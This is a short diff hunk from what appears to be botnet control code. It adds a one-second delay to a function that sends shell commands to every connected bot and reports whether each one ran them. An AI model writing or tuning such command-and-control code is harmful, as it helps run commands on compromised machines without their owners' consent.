@@ -77,6 +77,7 @@ def shell_exec(cmd):
     for bot in botnet:
         botnet[bot].send(cmd.encode())
         resp = botnet[bot].recv(1024).decode()
+        sleep(1)
         if(resp == "DONE"):
             shell_resp = botnet[bot].recv(1024).decode()
             print("[*] Shell execution successful on %s"%(bot))
